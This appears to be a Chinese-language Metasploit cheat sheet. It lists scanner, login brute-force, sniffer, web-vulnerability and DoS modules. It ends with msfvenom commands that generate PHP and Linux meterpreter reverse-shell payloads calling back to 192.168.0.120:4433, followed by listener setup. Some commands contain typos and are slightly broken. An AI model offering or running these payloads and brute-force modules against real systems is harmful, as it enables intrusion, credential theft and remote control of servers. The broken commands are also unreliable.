# msfvenom
 metasploit 更新后就移除了 msfencode 以及 msfpayload

 http://www.freebuf.com/sectool/69362.html
 http://blog.51cto.com/biock/1658668
 http://www.secist.com/archives/1070.html
 http://blog.csdn.net/lijia111111/article/details/64124693

# 扫描模块

auxiliary/scanner/portscan
scanner/portscan/ack
scanner/portscan/ftpbounce
scanner/portscan/syn
scanner/portscan/tcp
scanner/portscan/xmas
smb 扫描
smb 枚举 auxiliary/scanner/smb/smb_enumusers
返回 DCERPC 信息 auxiliary/scanner/smb/pipe_dcerpc_auditor 扫描 SMB2 协议 auxiliary/scanner/smb/smb2
扫描 smb 共享文件 auxiliary/scanner/smb/smb_enumshares 枚举系统上的用户 auxiliary/scanner/smb/smb_enumusers
SMB 登录 auxiliary/scanner/smb/smb_login
SMB 登录 use windows/smb/psexec
扫描组的用户 auxiliary/scanner/smb/smb_lookupsid 扫描系统版本 auxiliary/scanner/smb/smb_version
mssql 扫描(端口 tcp1433udp1434)
admin/mssql/mssql_enum MSSQL 枚举
ACK 防火墙扫描 FTP 跳端口扫描 SYN 端口扫描
TCP 端口扫描 TCP"XMas"端口扫描
admin/mssql/mssql_exec admin/mssql/mssql_sql scanner/mssql/mssql_login scanner/mssql/mssql_ping
另外还有一个 mssql_payload 的模块 利用使用的 smtp 扫描
MSSQL 执行命令
MSSQL 查询
MSSQL 登陆工具
测试 MSSQL 的存在和信息
smtp 枚举 auxiliary/scanner/smtp/smtp_enum
扫描 smtp 版本 auxiliary/scanner/smtp/smtp_version
snmp 扫描
通过 snmp 扫描设备 auxiliary/scanner/snmp/community
ssh 扫描
ssh 登录 auxiliary/scanner/ssh/ssh_login
ssh 公共密钥认证登录 auxiliary/scanner/ssh/ssh_login_pubkey 扫描 ssh 版本测试 auxiliary/scanner/ssh/ssh_version
telnet 扫描
telnet 登录 auxiliary/scanner/telnet/telnet_login
扫描 telnet 版本 auxiliary/scanner/telnet/telnet_version tftp 扫描
扫描 tftp 的文件 auxiliary/scanner/tftp/tftpbrute
ftp 版本扫描 scanner/ftp/anonymous

ARP 扫描
auxiliary/scanner/discovery/arp_sweep
扫描 UDP 服务的主机 auxiliary/scanner/discovery/udp_probe 检测常用的 UDP 服务 auxiliary/scanner/discovery/udp_sweep sniffer 密码 auxiliary/sniffer/psnuffle
snmp 扫描 scanner/snmp/community
vnc 扫描无认证扫描 scanner/vnc/vnc_none_auth
web 服务器信息扫描模块
Module auxiliary/scanner/http/http_version
Module auxiliary/scanner/http/open_proxy
Module auxiliary/scanner/http/robots_txt
Module auxiliary/scanner/http/frontpage_login
Module auxiliary/admin/http/tomcat_administration Module auxiliary/admin/http/tomcat_utf8_traversal
Module auxiliary/scanner/http/options
Module auxiliary/scanner/http/drupal_views_user_enum Module auxiliary/scanner/http/scraper
Module auxiliary/scanner/http/svn_scanner
Module auxiliary/scanner/http/trace
Module auxiliary/scanner/http/vhost_scanner

Module auxiliary/scanner/http/webdav_internal_ip Module auxiliary/scanner/http/webdav_scanner
Module auxiliary/scanner/http/webdav_website_content 文件目录扫描模块
Module auxiliary/dos/http/apache_range_dos
Module auxiliary/scanner/http/backup_file
Module auxiliary/scanner/http/brute_dirs
Module auxiliary/scanner/http/copy_of_file
Module auxiliary/scanner/http/dir_listing
Module auxiliary/scanner/http/dir_scanner
Module auxiliary/scanner/http/dir_webdav_unicode_bypass Module auxiliary/scanner/http/file_same_name_dir
Module auxiliary/scanner/http/files_dir
Module auxiliary/scanner/http/http_put
Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass Module auxiliary/scanner/http/prev_dir_same_name_file
Module auxiliary/scanner/http/replace_ext
Module auxiliary/scanner/http/soap_xml
Module auxiliary/scanner/http/trace_axd
Module auxiliary/scanner/http/verb_auth_bypass

web 应用程序漏洞扫描模块
Module auxiliary/scanner/http/blind_sql_query Module auxiliary/scanner/http/error_sql_injection Module auxiliary/scanner/http/http_traversal
Module auxiliary/scanner/http/rails_mass_assignment Module exploit/multi/http/lcms_php_exec
# php rev
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.120 LPORT=4433 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# linux
msfvenom -p use payload/linux/x86/meterpreter/reverse_tcp  LHOST=192.168.0.120 LPORT=4433 -f elf >shell.elf

# 监听
use exploit/multi/handler
set payload 
sey LHOST
set LPORT

